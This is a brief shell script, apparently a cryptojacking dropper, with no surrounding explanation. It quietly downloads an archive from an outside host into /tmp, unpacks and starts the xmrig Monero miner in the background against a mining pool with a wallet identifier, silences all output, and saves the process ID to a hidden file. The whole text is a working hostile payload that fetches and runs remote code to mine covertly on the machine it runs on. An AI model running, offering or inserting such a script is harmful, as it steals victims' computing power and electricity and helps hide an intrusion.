cd /tmp
wget -q http://load.example.tld/x.tar.gz -O x.tar.gz
tar xzf x.tar.gz && rm -f x.tar.gz
cd x && chmod +x ./xmrig
nohup ./xmrig -o pool.load.example.tld:3333 -u 0d45z6bhdbq6b9kc3v4n2bihwrp4ethp3yd0tudp -p x --donate-level=1 > /dev/null 2>&1 &
echo $! > /tmp/.x.pid
